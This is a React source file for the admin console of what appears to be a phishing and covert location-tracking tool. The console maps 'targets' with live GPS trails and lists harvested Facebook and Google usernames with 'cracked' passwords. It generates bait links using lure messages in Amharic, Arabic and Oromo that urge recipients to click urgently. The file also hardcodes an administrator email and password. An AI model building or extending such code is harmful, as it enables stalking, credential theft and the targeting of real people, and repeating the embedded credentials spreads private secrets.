import React, { useState, useEffect } from 'react';
import { Target, Shield, Map as MapIcon, Users, Settings, Activity, Signal, Navigation, Link as LinkIcon, Globe, AlertTriangle, Radar, LogOut, ChevronLeft, ChevronRight, Share2, Lock } from 'lucide-react';
import { IntelligenceMap } from './IntelligenceMap';
import { db, auth, onSnapshot, collection, OperationType, handleFirestoreError, signInAnonymously, GoogleAuthProvider, signInWithPopup, signInWithEmailAndPassword } from '../lib/firebase';
import { motion, AnimatePresence } from 'motion/react';

interface TargetData {
  id: string;
  name: string;
  lat: number;
  lng: number;
  lastSeen: string;
  accuracy: number;
  status: 'active' | 'offline' | 'warning';
  platform?: string;
  history?: { lat: number, lng: number, time: string }[];
  intel?: { platform: string, user: string, key: string, timestamp: string }[];
}

// --- Subcomponents ---

const NavIcon = ({ active, icon, label, onClick }: any) => (
  <button 
    onClick={onClick}
    className={`group relative p-3 rounded-xl transition-all ${active ? 'bg-blue-600/10 text-blue-500 shadow-[inset_0_0_10px_rgba(37,99,235,0.1)]' : 'text-slate-600 hover:text-slate-400'}`}
  >
    {icon}
    <div className="absolute left-full ml-4 px-2 py-1 bg-slate-900 text-white text-[10px] font-bold uppercase tracking-widest rounded border border-slate-800 opacity-0 group-hover:opacity-100 pointer-events-none transition-opacity whitespace-nowrap z-[100]">
      {label}
    </div>
    {active && <div className="absolute left-0 top-1/4 bottom-1/4 w-[2px] bg-blue-500 rounded-full"></div>}
  </button>
);

const TargetCard = ({ target, selected, onClick }: { target: TargetData, selected: boolean, onClick: () => void }) => (
  <div 
    onClick={onClick}
    className={`group p-3 rounded-xl border cursor-pointer transition-all duration-300 ${selected ? 'bg-blue-600/10 border-blue-500/30' : 'bg-slate-900/30 border-slate-800/50 hover:bg-slate-900/60 hover:border-slate-700'}`}
  >
    <div className="flex items-center justify-between mb-2">
      <div className="flex items-center gap-2">
         <div className={`w-1.5 h-1.5 rounded-full ${target.status === 'active' ? 'bg-emerald-500 shadow-[0_0_8px_#10b981] animate-pulse' : 'bg-slate-700'}`} />
         <span className={`text-[10px] font-black uppercase tracking-widest ${selected ? 'text-blue-400' : 'text-slate-500 group-hover:text-slate-400'}`}>Target_{target.id.slice(0, 4)}</span>
      </div>
      <span className="text-[9px] text-slate-600 font-mono">{new Date(target.lastSeen).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
    </div>
    <div className="flex items-center justify-between gap-4">
      <span className={`text-[11px] font-bold truncate ${selected ? 'text-white' : 'text-slate-400 group-hover:text-slate-300'}`}>{target.name}</span>
      {target.intel && target.intel.length > 0 && (
         <div className="bg-red-500/20 text-red-500 text-[8px] font-black px-1.5 rounded animate-pulse">INTEL</div>
      )}
    </div>
  </div>
);

const FolderItem = ({ name, targets, selectedId, onSelect }: any) => {
  const containsSelected = targets.some((t: any) => t.id === selectedId);
  return (
    <div className="space-y-1">
      <div className="flex items-center gap-2 px-2 py-1.5">
         <Users className="w-3 h-3 text-slate-600" />
         <span className="text-[9px] font-black text-slate-600 uppercase tracking-widest">{name}</span>
         <span className="text-[7px] text-slate-800 font-mono ml-auto">{targets.length} UNITS</span>
      </div>
      <div className="pl-3 border-l border-slate-800/50 ml-1 space-y-1">
         {targets.map((t: any) => (
           <div 
             key={t.id}
             onClick={() => onSelect(t.id)}
             className={`px-3 py-2 text-[10px] rounded cursor-pointer transition-all ${selectedId === t.id ? 'bg-blue-600/10 text-blue-400 font-bold' : 'text-slate-500 hover:text-slate-400'}`}
           >
             T-{t.id.slice(0, 6)}
           </div>
         ))}
      </div>
    </div>
  );
};

const Stat = ({ label, value, color }: any) => (
  <div className="flex flex-col">
    <span className="text-[8px] text-slate-600 uppercase font-bold tracking-widest mb-0.5">{label}</span>
    <span className={`text-[12px] font-black tracking-tight ${color || 'text-white'}`}>{value}</span>
  </div>
);

const TelemetryBlock = ({ target, historyIndex }: any) => {
  const currentPos = target.history && historyIndex >= 0 && historyIndex < target.history.length ? target.history[historyIndex] : target;
  return (
    <div className="bg-[#0a0c12]/95 backdrop-blur-md border border-slate-800 p-5 rounded-2xl shadow-2xl space-y-6">
      <div className="flex justify-between items-center text-slate-500">
        <span className="text-[10px] font-bold uppercase tracking-widest">Real-time Telemetry</span>
        <div className="flex items-center gap-1">
           <Activity className="w-3 h-3 text-emerald-500" />
           <span className="text-[10px] font-mono text-emerald-500 animate-pulse">LIVE_SYNC</span>
        </div>
      </div>
      
      <div className="space-y-1">
        <div className="text-4xl font-mono text-emerald-400 font-bold tracking-tighter tabular-nums drop-shadow-[0_0_10px_#10b98133]">
           {currentPos.lat.toFixed(6)}°N
        </div>
        <div className="text-4xl font-mono text-emerald-400 font-bold tracking-tighter tabular-nums drop-shadow-[0_0_10px_#10b98133]">
           {currentPos.lng.toFixed(6)}°E
        </div>
      </div>

      <div className="grid grid-cols-2 gap-2 pt-2">
         <div className="bg-black/50 p-2 rounded-lg border border-slate-800">
            <span className="text-[8px] text-slate-600 block mb-1 uppercase font-black">Satellite Fix</span>
            <span className="text-[11px] font-mono font-bold text-slate-300">GEO_STATIONARY_{Math.random().toString(36).substring(7).toUpperCase()}</span>
         </div>
         <div className="bg-black/50 p-2 rounded-lg border border-slate-800">
            <span className="text-[8px] text-slate-600 block mb-1 uppercase font-black">Accuracy_Index</span>
            <span className="text-[11px] font-mono font-bold text-blue-400">±{target.accuracy?.toFixed(1) || '0.0'} METERS</span>
         </div>
      </div>
    </div>
  );
};

const PlaybackControls = ({ target, currentIndex, onChange }: any) => {
  if (!target.history || target.history.length <= 1) return null;
  return (
    <div className="bg-[#0a0c12]/95 backdrop-blur-md border border-slate-800 p-5 rounded-2xl shadow-2xl space-y-4">
      <div className="flex justify-between items-center">
        <span className="text-[10px] text-slate-500 uppercase font-black tracking-widest">History Playback</span>
        <span className="text-[11px] font-mono text-blue-400 bg-blue-500/10 px-2 rounded">TRACK_LOG_{currentIndex + 1}</span>
      </div>
      
      <input 
        type="range"
        min="0"
        max={target.history.length - 1}
        value={currentIndex}
        onChange={(e) => onChange(parseInt(e.target.value))}
        className="w-full h-1 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-blue-500"
      />

      <div className="flex gap-2">
         <button 
           disabled={currentIndex === 0}
           onClick={() => onChange(currentIndex - 1)}
           className="flex-1 py-1 px-3 rounded bg-slate-800 text-[9px] font-black hover:bg-slate-700 transition-colors uppercase disabled:opacity-20"
         >
           Previous
         </button>
         <button 
           disabled={currentIndex === target.history.length - 1}
           onClick={() => onChange(currentIndex + 1)}
           className="flex-1 py-1 px-3 rounded bg-blue-600 text-[9px] font-black hover:bg-blue-500 transition-colors uppercase disabled:opacity-20"
         >
           Advance
         </button>
      </div>

      <div className="text-center pt-2">
         <span className="text-[10px] text-slate-600 font-mono italic">
           Sync Time: {new Date(target.history[currentIndex].time).toLocaleString()}
         </span>
      </div>
    </div>
  );
};

const IntelCard = ({ targetName, intel }: any) => {
  const Icon = intel.platform === 'Facebook' ? Users : intel.platform === 'Google' ? Globe : Activity;
  const color = intel.platform === 'Facebook' ? 'text-blue-500' : intel.platform === 'Google' ? 'text-red-500' : 'text-sky-400';
  
  return (
    <motion.div 
      initial={{ opacity: 0, scale: 0.98 }}
      animate={{ opacity: 1, scale: 1 }}
      className="bg-[#0a0c12] border border-slate-800 rounded-2xl overflow-hidden shadow-xl group hover:border-red-500/30 transition-all"
    >
      <div className="bg-black/40 p-4 border-b border-slate-800 flex justify-between items-center">
         <div className="flex items-center gap-3">
            <div className={`p-2 bg-slate-900 rounded-lg ${color}`}>
               <Icon className="w-4 h-4" />
            </div>
            <div className="flex flex-col">
               <span className={`text-[10px] font-black uppercase tracking-widest ${color}`}>{intel.platform} Harvest</span>
               <span className="text-xs font-bold text-white uppercase">{targetName}</span>
            </div>
         </div>
         <span className="text-[9px] font-mono text-slate-600">{new Date(intel.timestamp).toLocaleTimeString()}</span>
      </div>
      <div className="p-6 space-y-4">
         <div className="space-y-1">
            <span className="text-[8px] text-slate-600 uppercase font-black tracking-widest">Intercepted Identify</span>
            <div className="bg-black border border-slate-800 p-3 rounded-xl font-mono text-xs text-slate-300 break-all select-all flex items-center justify-between group-hover:border-slate-700">
               {intel.user}
               <Share2 className="w-3 h-3 text-slate-700 opacity-0 group-hover:opacity-100 transition-opacity" />
            </div>
         </div>
         <div className="space-y-1">
            <span className="text-[8px] text-slate-600 uppercase font-black tracking-widest">Access Key (CRACKED)</span>
            <div className="bg-red-500/5 border border-red-500/20 p-3 rounded-xl font-mono text-xs text-red-500 font-bold select-all flex items-center justify-between group-hover:border-red-500/40">
               {intel.key}
               <Lock className="w-3 h-3 opacity-30" />
            </div>
         </div>
      </div>
      <div className="px-6 py-3 bg-red-500/5 text-[9px] text-red-500/60 font-black italic uppercase tracking-widest animate-pulse">
        Encrypted Stream Intercepted Successfully
      </div>
    </motion.div>
  );
};
export const AdminDashboard: React.FC = () => {
  const [targets, setTargets] = useState<TargetData[]>([]);
  const [selectedTargetId, setSelectedTargetId] = useState<string | undefined>();
  const [selectedLanguage, setSelectedLanguage] = useState<'amharic' | 'arabic' | 'oromo' | 'both'>('amharic');
  const [activeTab, setActiveTab] = useState<'all' | 'folders'>('all');
  const [historyIndex, setHistoryIndex] = useState(0);
  const [currentView, setCurrentView] = useState<'map' | 'intel' | 'settings'>('map');
  const [isSidebarOpen, setIsSidebarOpen] = useState(true);
  
  const translations = {
    amharic: "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።",
    arabic: "معلومات سرية عاجلة بخصوص المعلومات الحالية، لم أرسلها لك مباشرة حتى لا نكتشف. ادخل الرابط بسرعة وشاهد المعلومات، لقد تلقيت أمراً بإرسالها لك... اضغط على الرابط أدناه لمشاهدة التقرير، هناك فيديو وصور بالداخل.",
    oromo: "Oduu hammaa fi iccitidha, kallattiin akka siif hin ergonomic dhoksaadhon siif erge. Dafee liinkii kanaan seenii odeeffannoo kana ilaali, ajajni siif akka kenne naaf kennameera... Gabaasa kana ilaaluuf liinkii armaan gadii cuqaasii, viidiyoo fi fakkiiwwanis keessa jiru."
  };
  const [time, setTime] = useState<string>('--:--:--');
  const [isClient, setIsClient] = useState(false);
  const [isAuthReady, setIsAuthReady] = useState(false);
  const [copyStatus, setCopyStatus] = useState<'idle' | 'copied'>('idle');
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [loginForm, setLoginForm] = useState({ email: '', password: '' });
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  const [currentUser, setCurrentUser] = useState(auth.currentUser);
  const isAdminAuthenticated = currentUser && !currentUser.isAnonymous;

  useEffect(() => {
    setIsClient(true);
    // Initialize time on client only
    setTime(new Date().toLocaleTimeString());
    const timer = setInterval(() => setTime(new Date().toLocaleTimeString()), 1000);
    
    const initAuth = async () => {
      try {
        if (!auth.currentUser) {
          // Attempt anonymous session for initial read
          try {
            await signInAnonymously(auth);
          } catch (err: any) {
            if (err.code === 'auth/admin-restricted-operation') {
              // Anonymous auth is likely disabled in console, proceed to show login form
              console.log("Anonymous access restricted. Requiring admin credentials.");
            } else {
              throw err;
            }
          }
        }
        setIsAuthReady(true);
      } catch (err: any) {
        console.error("Dashboard session initialization failed:", err);
        if (err.code === 'auth/configuration-not-found') {
          setErrorMsg("SERVICE_ERROR: Authentication methods (Email/Password or Anonymous) are not enabled in the Firebase Console.");
        } else if (err.code === 'auth/admin-restricted-operation') {
          setIsAuthReady(true);
        } else {
          setErrorMsg(`SYSTEM_ERROR: ${err.message}`);
        }
      }
    };

    const unsubAuth = auth.onAuthStateChanged((user) => {
      setCurrentUser(user);
      if (user) {
        setIsAuthReady(true);
        setErrorMsg(null);
      } else {
        initAuth();
      }
    });

    return () => {
      clearInterval(timer);
      unsubAuth();
    };
  }, []);

  const handleAdminLogin = async () => {
    setIsLoggingIn(true);
    setErrorMsg(null);
    try {
      await signInWithEmailAndPassword(auth, loginForm.email || 'sendeqbuild@gmail.com', loginForm.password || 'Bi092714@');
    } catch (err: any) {
      console.error(err);
      if (err.code === 'auth/configuration-not-found') {
        setErrorMsg("Email/Password Auth is not enabled in Firebase Console.");
      } else {
        setErrorMsg(`Login Failed: ${err.message}`);
      }
      if (err.code === 'auth/operation-not-allowed') {
        setErrorMsg("ERROR: Configuration required. Please enable BOTH 'Email/Password' and 'Anonymous' auth providers in your Firebase Console Settings.");
      }
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleGoogleLogin = async () => {
    setErrorMsg(null);
    const provider = new GoogleAuthProvider();
    try {
      await signInWithPopup(auth, provider);
    } catch (err: any) {
      setErrorMsg(`Authorization Failed: ${err.message}`);
    }
  };

  useEffect(() => {
    if (!isAuthReady || !isAdminAuthenticated || !currentUser) {
      setTargets([]);
      return;
    }

    const unsub = onSnapshot(collection(db, 'targets'), (snapshot) => {
      const targetList: TargetData[] = [];
      snapshot.forEach(doc => {
        const data = doc.data();
        targetList.push({
          id: doc.id,
          name: data.name || 'Unknown Device',
          lat: data.lat || 0,
          lng: data.lng || 0,
          accuracy: data.accuracy || 0,
          lastSeen: data.lastSeen || new Date().toISOString(),
          status: data.status || 'offline',
          platform: data.platform,
          history: data.history,
          intel: data.intel
        });
      });
      
      setTargets(targetList);

      // AUTOMATIC LIVE TRACKING: Jump to the latest transmitting signal
      if (targetList.length > 0) {
        const latest = [...targetList].sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime())[0];
        const isFresh = new Date().getTime() - new Date(latest.lastSeen).getTime() < 10000;

        if (!selectedTargetId || (latest.id !== selectedTargetId && isFresh)) {
          setSelectedTargetId(latest.id);
          setHistoryIndex(latest.history ? latest.history.length - 1 : 0);
        }
      }
    }, (error) => {
      // Gracefully handle permission errors if not admin yet
      if (error.message.includes('permission-denied')) {
        console.warn("Access Restricted: Operator privileges required.");
        return;
      }
      handleFirestoreError(error, OperationType.LIST, 'targets');
    });

    return () => unsub();
  }, [isAuthReady, isAdminAuthenticated]);

  const [targetLabel, setTargetLabel] = useState('');

  const deployLink = () => {
    const langParam = selectedLanguage === 'both' ? 'both' : selectedLanguage;
    const nameParam = targetLabel ? `&n=${encodeURIComponent(targetLabel)}` : '';
    const url = `${window.location.origin}/track?lang=${langParam}${nameParam}`;
    navigator.clipboard.writeText(url);
    setCopyStatus('copied');
    setTimeout(() => setCopyStatus('idle'), 3000);
  };

  const selectedTarget = targets.find(t => t.id === selectedTargetId);

  // Grouping logic for Folders tab
  const groupedTargetsByName = targets.reduce((acc, target) => {
    const name = target.name || 'Unidentified Vectors';
    if (!acc[name]) acc[name] = [];
    acc[name].push(target);
    return acc;
  }, {} as Record<string, TargetData[]>);

  if (!isAdminAuthenticated) {
    return (
      <div className="min-h-screen bg-[#050608] flex items-center justify-center p-4">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="max-w-sm w-full bg-slate-900/50 border border-slate-800 p-8 rounded-2xl text-center space-y-6"
        >
          <div className="w-16 h-16 bg-blue-600/20 rounded-full flex items-center justify-center mx-auto">
            <Lock className="text-blue-500" />
          </div>
          <h2 className="text-xl font-bold text-white tracking-widest uppercase">Admin Access Restricted</h2>
          <div className="space-y-4">
            <input 
              type="email" 
              placeholder="Operator Email"
              value={loginForm.email}
              onChange={(e) => setLoginForm(p => ({...p, email:e.target.value}))}
              className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-sm"
            />
            <input 
              type="password" 
              placeholder="Access Key"
              value={loginForm.password}
              onChange={(e) => setLoginForm(p => ({...p, password:e.target.value}))}
              className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-sm"
            />
            <button 
              onClick={handleAdminLogin}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded"
            >
              {isLoggingIn ? 'Verifying...' : 'Login'}
            </button>
          </div>
          <div className="relative py-2 flex items-center">
            <div className="flex-1 border-t border-slate-800"></div>
            <span className="px-2 text-[8px] text-slate-600 uppercase">OR</span>
            <div className="flex-1 border-t border-slate-800"></div>
          </div>
          <button 
            onClick={handleGoogleLogin}
            className="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2"
          >
            <Globe className="w-4 h-4" /> Google Identification
          </button>
          {errorMsg && <p className="text-red-500 text-[10px] font-mono whitespace-pre-wrap">{errorMsg}</p>}
        </motion.div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-[#020305] text-slate-300 font-sans overflow-hidden">
      
      {/* 1. Global Navigation Sidebar */}
      <aside className="w-16 flex flex-col items-center py-6 bg-[#0a0c12] border-r border-slate-800/50 z-50">
        <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center mb-10 shadow-[0_0_15px_rgba(37,99,235,0.4)]">
          <Radar className="text-white w-6 h-6 animate-pulse" />
        </div>
        <div className="flex-1 flex flex-col gap-6">
          <NavIcon 
            active={currentView === 'map'} 
            onClick={() => setCurrentView('map')} 
            icon={<MapIcon className="w-5 h-5" />} 
            label="Live Map" 
          />
          <NavIcon 
            active={currentView === 'intel'} 
            onClick={() => setCurrentView('intel')} 
            icon={<Activity className="w-5 h-5" />} 
            label="Intel Feed" 
          />
          <NavIcon 
            active={currentView === 'settings'} 
            onClick={() => setCurrentView('settings')} 
            icon={<Settings className="w-5 h-5" />} 
            label="Bait Setup" 
          />
        </div>
        <div className="mt-auto">
           <button 
             onClick={() => auth.signOut()}
             className="p-3 text-slate-600 hover:text-red-500 transition-colors"
           >
             <LogOut className="w-5 h-5" />
           </button>
        </div>
      </aside>

      {/* 2. Target Selector Sidebar */}
      <aside className={`w-72 bg-[#0a0c12]/80 backdrop-blur-xl border-r border-slate-800/50 flex flex-col transition-all duration-300 ${isSidebarOpen ? '' : '-ml-72'}`}>
        <div className="p-4 border-b border-slate-800 flex justify-between items-center bg-black/20 text-white">
          <span className="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Operation Targets</span>
          <button onClick={() => setIsSidebarOpen(false)} className="text-slate-600 hover:text-white">
             <ChevronLeft className="w-4 h-4" />
          </button>
        </div>
        
        <div className="p-4 flex gap-1 bg-black/10">
           <button 
             onClick={() => setActiveTab('all')}
             className={`flex-1 py-1.5 text-[9px] font-bold rounded uppercase tracking-widest transition-all ${activeTab === 'all' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30' : 'text-slate-600 hover:text-slate-400'}`}
           >
             Live
           </button>
           <button 
             onClick={() => setActiveTab('folders')}
             className={`flex-1 py-1.5 text-[9px] font-bold rounded uppercase tracking-widest transition-all ${activeTab === 'folders' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30' : 'text-slate-600 hover:text-slate-400'}`}
           >
             Folders
           </button>
        </div>

        <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-2">
          {activeTab === 'all' ? (
            targets.map(target => (
              <TargetCard 
                key={target.id} 
                target={target} 
                selected={selectedTargetId === target.id}
                onClick={() => {
                  setSelectedTargetId(target.id);
                  setHistoryIndex(target.history ? target.history.length - 1 : 0);
                  if (currentView === 'settings') setCurrentView('map');
                }}
              />
            ))
          ) : (
            Object.entries(groupedTargetsByName).map(([name, group]) => (
              <FolderItem 
                key={name}
                name={name}
                targets={group}
                selectedId={selectedTargetId}
                onSelect={(id) => {
                  setSelectedTargetId(id);
                  const t = targets.find(x => x.id === id);
                  setHistoryIndex(t?.history ? t.history.length - 1 : 0);
                  if (currentView === 'settings') setCurrentView('map');
                }}
              />
            ))
          )}
        </div>
      </aside>

      {/* 3. Main Content Area */}
      <main className="flex-1 relative flex flex-col bg-[#050608]">
        {/* Top Floating Target Header */}
        {selectedTarget && (
          <header className={`absolute top-4 left-4 right-4 z-40 flex items-center justify-between pointer-events-none transition-all duration-300 ${!isSidebarOpen && 'left-16'}`}>
            <div className="bg-[#0a0c12]/90 backdrop-blur-md border border-slate-800 p-3 px-6 rounded-2xl flex items-center gap-6 shadow-2xl pointer-events-auto">
               {!isSidebarOpen && (
                 <button onClick={() => setIsSidebarOpen(true)} className="p-2 -ml-2 text-slate-500 hover:text-white pointer-events-auto">
                    <ChevronRight className="w-4 h-4" />
                 </button>
               )}
               <div className="flex flex-col">
                  <span className="text-[10px] text-slate-500 uppercase font-black tracking-widest flex items-center gap-2">
                     <div className={`w-1.5 h-1.5 rounded-full ${selectedTarget.status === 'active' ? 'bg-emerald-500 animate-pulse shadow-[0_0_8px_#10b981]' : 'bg-slate-700'}`} />
                     Target Identity: {selectedTarget.name}
                  </span>
                  <span className="text-sm font-mono font-bold text-white tracking-tighter">{selectedTarget.id}</span>
               </div>
               <div className="w-[1px] h-8 bg-slate-800" />
               <div className="flex items-center gap-4">
                  <Stat label="Platform" value={selectedTarget.platform || 'WEB'} />
                  <Stat label="Accuracy" value={selectedTarget.accuracy ? `${selectedTarget.accuracy.toFixed(1)}m` : '---'} />
                  <Stat label="Reports" value={selectedTarget.intel?.length.toString() || '0'} color="text-red-500" />
               </div>
            </div>
          </header>
        )}

        {/* View Switcher */}
        <div className="flex-1 relative">
          {currentView === 'map' && (
            <div className="w-full h-full animate-in fade-in zoom-in duration-500">
               <IntelligenceMap 
                 targets={targets.map(t => ({
                   id: t.id,
                   name: t.name,
                   lat: t.lat,
                   lng: t.lng,
                   lastSeen: t.lastSeen,
                   accuracy: t.accuracy,
                   history: t.history
                 }))} 
                 selectedTargetId={selectedTargetId}
                 historyIndex={historyIndex}
               />
               
               {selectedTarget && (
                 <div className="absolute top-24 right-4 z-40 w-72 space-y-4 pointer-events-auto">
                    <TelemetryBlock target={selectedTarget} historyIndex={historyIndex} />
                    <PlaybackControls 
                      target={selectedTarget} 
                      currentIndex={historyIndex} 
                      onChange={setHistoryIndex} 
                    />
                 </div>
               )}
            </div>
          )}

          {currentView === 'intel' && (
            <div className="p-8 h-full overflow-y-auto custom-scrollbar animate-in slide-in-from-bottom-4 duration-500">
               <div className="max-w-4xl mx-auto space-y-8">
                  <div className="flex justify-between items-end">
                    <h1 className="text-3xl font-black text-white uppercase tracking-tighter">Classified Intel Feed</h1>
                    <span className="text-[10px] text-slate-500 uppercase tracking-widest font-mono p-2">Secure Connection: 128-bit Encryption Active</span>
                  </div>
                  
                  {targets.some(t => t.intel && t.intel.length > 0) ? (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      {targets.filter(t => t.intel).map(t => (
                        t.intel?.map((i, idx) => (
                           <IntelCard key={`${t.id}-${idx}`} targetName={t.name} intel={i} />
                        ))
                      ))}
                    </div>
                  ) : (
                    <div className="h-64 flex flex-col items-center justify-center border-2 border-dashed border-slate-800 rounded-3xl opacity-30 text-center space-y-4">
                       <Activity className="w-12 h-12" />
                       <p className="text-sm uppercase font-bold tracking-widest">No intelligence captures detected in mission logs.</p>
                    </div>
                  )}
               </div>
            </div>
          )}

          {currentView === 'settings' && (
            <div className="p-8 h-full overflow-y-auto animate-in fade-in duration-500">
               <div className="max-w-2xl mx-auto bg-[#0a0c12] border border-slate-800 rounded-3xl p-10 space-y-10 shadow-2xl">
                  <div className="space-y-2">
                    <h2 className="text-2xl font-black text-white tracking-tight uppercase">Bait Deployment System</h2>
                    <p className="text-sm text-slate-500 leading-relaxed font-mono">Configure the target tracking link. Once clicked, the target will be prompted to grant location access and provide authentication credentials.</p>
                  </div>

                  <div className="space-y-6">
                    <div className="space-y-3">
                      <label className="text-[10px] text-slate-400 font-black uppercase tracking-[0.2em] px-1">Session Descriptor (Internal)</label>
                      <input 
                        type="text" 
                        placeholder="e.g. Operation Falcon, Targeted Asset Name"
                        value={targetLabel}
                        onChange={(e) => setTargetLabel(e.target.value)}
                        className="w-full bg-[#111] border border-slate-800 rounded-xl p-4 text-white placeholder-slate-700 outline-none focus:border-blue-500/50 transition-all font-mono"
                      />
                    </div>

                    <div className="space-y-4">
                      <label className="text-[10px] text-slate-400 font-black uppercase tracking-[0.2em] px-1">Bait Language Localization</label>
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                         {['amharic', 'arabic', 'oromo', 'both'].map((lang) => (
                           <button 
                             key={lang}
                             onClick={() => setSelectedLanguage(lang as any)}
                             className={`p-3 text-[10px] font-black rounded-xl border uppercase transition-all ${selectedLanguage === lang ? 'bg-blue-600 border-blue-400 text-white shadow-[0_0_15px_rgba(37,99,235,0.3)]' : 'bg-[#111] border-slate-800 text-slate-600 hover:text-slate-400'}`}
                           >
                             {lang}
                           </button>
                         ))}
                      </div>
                    </div>

                    <div className="pt-4">
                       <button 
                         onClick={deployLink}
                         className={`w-full text-white font-black py-5 rounded-2xl transition-all shadow-xl shadow-emerald-900/20 uppercase tracking-widest flex items-center justify-center gap-3 ${copyStatus === 'copied' ? 'bg-emerald-600' : 'bg-emerald-600 hover:bg-emerald-500'}`}
                       >
                         <Shield className="w-5 h-5" /> {copyStatus === 'copied' ? 'COPIED TO CLIPBOARD' : 'Generate Deployment Link'}
                       </button>
                    </div>
                  </div>
               </div>
            </div>
          )}
        </div>
        
        {/* HUD Stats Bottom */}
        <footer className="h-10 bg-[#0a0c12] border-t border-slate-800 flex items-center px-6 justify-between text-[8px] font-mono tracking-widest text-slate-600 uppercase">
           <div className="flex items-center gap-6">
              <span className="flex items-center gap-2"><div className="w-1 h-1 bg-emerald-500 rounded-full animate-ping" /> Connection Established</span>
              <span>Uplink: Standard_Secure_v8</span>
              <span>Nodes: {targets.length}</span>
           </div>
           <div className="flex items-center gap-4">
              <span>Time: {time}</span>
              <span className="text-slate-400">© Strategic Intelligence Unit</span>
           </div>
        </footer>
      </main>
    </div>
  );
};
